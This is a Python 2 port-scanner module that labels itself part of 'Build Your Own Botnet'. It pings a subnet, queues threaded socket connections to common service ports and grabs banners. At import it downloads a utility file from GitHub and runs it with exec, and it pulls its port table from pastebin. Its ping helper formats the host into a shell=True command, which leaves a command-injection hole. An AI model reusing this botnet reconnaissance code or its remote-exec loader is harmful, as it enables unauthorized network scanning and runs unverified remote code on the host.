#!/usr/bin/python
# -*- coding: utf-8 -*-
'Port Scanner (Build Your Own Botnet)'

# standard libarary
import os
import sys
import imp
import time
import json
import Queue
import socket
import random
import urllib
import argparse
import threading
import subprocess
import collections

# utilities
util = imp.new_module('util')
exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
sys.modules['util'] = util

# globals
packages  = []
platforms = ['win32','linux2','darwin']
ports     = json.loads(urllib.urlopen('https://pastebin.com/raw/WxK7eUSd').read())
tasks     = Queue.Queue()
threads   = {}
targets   = []
results   = {}

# setup
util.is_compatible(platforms, __name__)
util.imports(packages, __builtins__)

# main
def _ping(host):
    try:
        if host not in globals()['results']:
            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                globals()['results'][host] = {}
                return True
            else:
                return False
        else:
            return True
    except:
        return False

@util.threaded
def _threader():
    while True:
        try:
            method, task = globals()['tasks'].get_nowait()
            if callable(method):
                _ = method(task)
            globals()['tasks'].task_done()
        except:
            break

def _scan(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        sock.connect((str(target.host), int(target.port)))
        data = sock.recv(1024)
        sock.close()
        if data:
            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
            data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')
            item = {str(target.port) : {'protocol': globals()['ports'][str(target.port)]['protocol'], 'service': data, 'state': 'open'}}
        else:
            item = {str(target.port) : {'protocol': globals()['ports'][str(target.port)]['protocol'], 'service': globals()['ports'][str(target.port)]['service'], 'state': 'open'}}
        globals()['results'].get(target.host).update(item)
    except (socket.error, socket.timeout):
        pass
    except Exception as e:
        util.log("{} error: {}".format(_scan.func_name, str(e)))


def run(target='192.168.1.1', subnet=False, ports=[21,22,23,25,80,110,111,135,139,443,445,993,995,1433,1434,3306,3389,8000,8008,8080,8888]):
    """ 
    Run a portscan against a target hostname/IP address

    `Optional`
    :param str target: Valid IPv4 address
    :param list ports: Port numbers to scan on target host
    :returns: Results in a nested dictionary object in JSON format

    Returns onlne targets & open ports as key-value pairs in dictionary (JSON) object
    """
    try:
        if not util.ipv4(target):
            raise ValueError("target is not a valid IPv4 address")
        task = collections.namedtuple('Target', ['host', 'port'])
        stub = '.'.join(target.split('.')[:-1]) + '.%d'
        util.log('Scanning for online hosts in subnet {} - {}'.format(stub % 1, stub % 255))
        if subnet:
            for x in range(1,255):
                if _ping(stub % x):
                    globals()['targets'].append(stub % x)
                    for port in ports:
                        globals()['tasks'].put_nowait((_scan, task(stub % x, port)))
        else:
            globals()['targets'].append(target)
            if _ping(target):
                for port in ports:
                    globals()['tasks'].put_nowait((_scan, task(target, port)))
        if globals()['tasks'].qsize():
            for i in range(1, int((globals()['tasks'].qsize() / 100) if globals()['tasks'].qsize() >= 100 else 1)):
                threads['portscan-%d' % i] = _threader(globals()['tasks'])
            if globals()['results'] and len(globals()['results']):
                return dict({k: globals()['results'][k] for k in sorted(globals()['results'].keys()) if k in globals()['targets']})
            else:
                return "Target(s) offline"
    except Exception as e:
        util.log("{} error: {}".format(_scan.func_name, str(e)))

